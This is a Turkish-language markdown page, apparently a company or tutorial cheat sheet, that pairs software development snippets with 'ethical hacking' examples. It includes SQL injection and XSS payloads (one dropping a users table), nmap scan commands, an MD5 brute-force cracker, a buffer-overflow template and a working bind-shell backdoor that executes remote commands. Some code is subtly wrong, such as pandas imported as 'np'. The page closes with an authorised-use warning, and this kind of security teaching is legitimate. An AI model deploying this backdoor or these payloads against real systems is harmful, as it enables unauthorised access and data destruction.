# AYZIO TECHNOLOGY - YAZILIM GELİŞTİRME & SİBER GÜVENLİK

## 📌 YAZILIM GELİŞTİRME

### 🐍 Python Geliştirme
```python
# Web scraping & otomasyon
import requests
from bs4 import BeautifulSoup
import selenium

# Veri analizi & AI/ML
import pandas as np
import tensorflow as tf
from sklearn import datasets

# Backend geliştirme
from flask import Flask
from django.db import models
import fastapi
```

### 🐘 PHP Geliştirme
```php
<?php
// Laravel Framework
namespace App\Http\Controllers;
use Illuminate\Http\Request;

// WordPress eklenti geliştirme
add_action('wp_enqueue_scripts', 'custom_scripts');
add_filter('the_content', 'modify_content');

// API geliştirme
header('Content-Type: application/json');
echo json_encode($data);
?>
```

### ☕ Java Geliştirme
```java
// Spring Boot
@RestController
public class ApiController {
    @GetMapping("/api/data")
    public ResponseEntity<?> getData() {
        return ResponseEntity.ok().body(data);
    }
}

// Android geliştirme
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
}
```

## 🔐 SİBER GÜVENLİK & HACKING

### 🔍 Ethical Hacking Araçları
```python
# Port tarama
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

# Vulnerability scanning
import nmap
import requests
from bs4 import BeautifulSoup

# Password cracking
import hashlib
import itertools
from passlib.hash import sha256_crypt
```

### 🌐 Web Application Security
```python
# SQL Injection test
def test_sql_injection(url, param):
    payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users--"]
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if "error" in response.text.lower():
            print(f"Vulnerable: {payload}")

# XSS test
def test_xss(url):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
    for payload in xss_payloads:
        # Test implementation
        pass
```

### 📡 Network Security
```bash
# Nmap tarama
nmap -sS -sV -O target.com
nmap -p 1-65535 -T4 target.com

# Wireshark filtreleri
tcp.port == 80
http.request.method == "POST"
ip.src == 192.168.1.1
```

### 🔑 Cryptography
```python
# Şifreleme/Çözme
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa

# Hash cracking
import hashlib
import itertools

def crack_hash(target_hash, charset, max_length):
    for length in range(1, max_length + 1):
        for attempt in itertools.product(charset, repeat=length):
            attempt = ''.join(attempt)
            hash_attempt = hashlib.md5(attempt.encode()).hexdigest()
            if hash_attempt == target_hash:
                return attempt
    return None
```

## 🛠️ PRATİK HACKING TEKNİKLERİ

### 1. Information Gathering
```python
# Subdomain enumeration
import dns.resolver

def find_subdomains(domain):
    subdomains = []
    common_subs = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'cpanel']
    
    for sub in common_subs:
        try:
            target = f"{sub}.{domain}"
            dns.resolver.resolve(target, 'A')
            subdomains.append(target)
        except:
            continue
    return subdomains
```

### 2. Exploitation
```python
# Basit exploit template
import socket
import struct

def exploit_target(ip, port):
    # Buffer overflow payload
    buffer = b"A" * 1000
    # Shellcode
    shellcode = b"\x90" * 50  # NOP sled
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(buffer + shellcode)
        response = s.recv(1024)
        s.close()
        return response
    except Exception as e:
        print(f"Exploit failed: {e}")
```

### 3. Post-Exploitation
```python
# Backdoor oluşturma
import socket
import subprocess
import os

def create_backdoor(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    
    while True:
        client, addr = s.accept()
        # Komut çalıştırma
        while True:
            command = client.recv(1024).decode()
            if command.lower() == 'exit':
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client.send(output)
            except:
                client.send(b"Command failed")
        client.close()
```

## 🚀 GÜVENLİK TESTİ ARAÇLARI

### Python Security Scanner
```python
class SecurityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
    
    def scan_sql_injection(self):
        # SQL injection testleri
        pass
    
    def scan_xss(self):
        # XSS testleri
        pass
    
    def scan_csrf(self):
        # CSRF testleri
        pass
    
    def generate_report(self):
        # Güvenlik raporu oluştur
        return self.vulnerabilities
```

## ⚠️ ÖNEMLİ UYARILAR

**SADECE ETHICAL HACKING İÇİN KULLANIN:**
- Yalnızca kendi sistemlerinizde test yapın
- Yazılı izin olmadan başkalarının sistemlerine erişmeyin
- Bilgileri sadece eğitim ve güvenlik geliştirme amaçlı kullanın

## 📚 ÖĞRENME KAYNAKLARI

- **OWASP Top 10** - Web uygulama güvenliği
- **Metasploit Framework** - Penetrasyon testi
- **Burp Suite** - Web uygulama güvenlik testi
- **Wireshark** - Network analizi

---

**"Bilgi güçtür, sorumlulukla kullanın."** - AYZIO Technology Security Team
